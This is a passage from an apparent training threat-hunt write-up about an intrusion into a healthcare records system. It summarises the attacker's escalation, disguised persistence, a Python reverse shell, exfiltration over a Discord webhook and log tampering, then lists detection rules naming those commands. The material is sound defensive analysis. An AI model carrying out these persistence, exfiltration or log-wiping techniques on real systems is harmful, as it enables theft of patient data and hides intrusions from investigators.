The attacker conducted a methodical, low-noise compromise of a healthcare EMR environment — starting with quiet reconnaissance through a compromised administrative account, escalating to root through legitimate `sudo` access, harvesting database credentials from an environment file, and mapping patient data through Docker volume enumeration.
 
Persistence was layered: a disguised systemd service (`integration-monitor.service`), a hijacked cron script (`backup_manifest.sh`), and a rogue service account created via `vipw` to bypass standard account-creation monitoring. Command and control was established through a textbook Python3 reverse shell over port 443. After an initial direct exfiltration attempt via `scp` was blocked, the attacker pivoted to a Discord webhook — a Living-off-the-Land technique that blended with legitimate SaaS traffic.
 
The cleanup phase showed deliberate restraint rather than panic: 12 surgical `sed -i` deletions across two log files, followed by `touch -d` timestamp forging to distort the forensic timeline. Despite this precision, Microsoft Defender's EDR independently caught the timestomping activity, proving that behavioral detection can surface what manual log review misses.
 
🛡️ **Recommendations**
 
* Implement File Integrity Monitoring (FIM) on `/etc/systemd/system/`, `/etc/cron.d/`, and `/var/log/`
* Restrict `sudo` access for service accounts to specific commands via sudoers, not blanket `sudo -i`
* Alert on `sed -i` operations targeting `/var/log/`, and on `touch -d` invocations against log files
* Monitor for `useradd --system` and direct `/etc/passwd` edits via `vipw`/`vigr` outside of provisioning windows
* Block or alert on `curl -F` uploads to consumer SaaS webhook domains (Discord, Slack, Telegram) from production hosts
* Enable Docker volume access auditing — alert on `find /var/lib/docker/volumes` from non-orchestration accounts
---
 
---
 
<div align="center">
**Amine Mouammine** · Cybersecurity Analyst & Threat Hunter · New York, NY
 
CompTIA Security+ · Microsoft SC-200 · TryHackMe Top 3% · Microsoft Sentinel · KQL · MITRE ATT&CK

## 👤 Analyst

**Amine Mouammine** — Cybersecurity Analyst & Threat Hunter · New York, NY .



---

<div align="center">
<sub>Rocky Clinic · IR Hunt 07 · 29 Questions · 9 Phases · Microsoft Sentinel · 2026</sub>
</div>
